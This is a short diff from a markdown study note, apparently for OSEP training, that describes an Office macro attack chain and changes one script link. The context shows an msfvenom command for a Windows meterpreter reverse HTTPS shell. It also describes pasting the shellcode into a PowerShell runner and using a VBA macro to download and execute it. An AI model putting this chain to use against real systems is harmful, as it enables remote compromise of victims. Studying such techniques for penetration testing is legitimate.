@@ -62,7 +62,7 @@ We can execute the code of a remote script by using some Powershell methods.
     ```shell
     msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
     ```
-2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) or [CustomeShellcodeRunner.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/CustomeShellcodeRunner.ps1) script.
+2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) or [InyectionShellcode.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/InyectionShellcode.ps1) script.
 
 3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared VBAenvlauncher.ps1 script. The line stored on the *str* var must be:
 
